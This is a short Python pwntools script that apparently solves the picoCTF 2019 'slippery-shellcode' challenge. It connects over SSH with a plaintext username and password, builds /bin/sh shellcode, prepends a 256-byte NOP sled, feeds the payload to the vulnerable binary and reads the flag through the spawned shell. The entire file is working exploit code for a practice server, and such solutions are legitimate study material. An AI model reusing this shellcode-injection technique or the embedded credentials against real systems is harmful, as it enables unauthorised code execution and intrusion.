from pwn import *
s=ssh(host="2019shell1.picoctf.com",user="cse331",password="3curityishard")
s.set_working_directory(wd=b"/problems/slippery-shellcode_1_69e5bb04445e336005697361e4c2deb0")
# https://python3-pwntools.readthedocs.io/en/latest/shellcraft.html
# http://docs.pwntools.com/en/latest/asm.html
shellcode = asm(shellcraft.sh())
p = s.process("./vuln")

# int offset = (rand() % 256) + 1;
# ((void (*)())(buf+offset))();
# It jumps to a random location within the first 256 bytes of the buf, we can put 256 bytes of nop-sled before the shellcode, everything else is the same with task1
nop_sled = b'\x90' * 256
p.sendlineafter("Enter your shellcode:\n", nop_sled+shellcode) # https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
p.sendlineafter("Thanks! Executing from a random location now...\n$ ", "cat flag.txt\n")
flag = p.recv(timeout=1).decode("utf-8") # https://stackoverflow.com/questions/606191/convert-bytes-to-a-string
flag = flag.split("{")[1].split("}")[0]
print(flag)
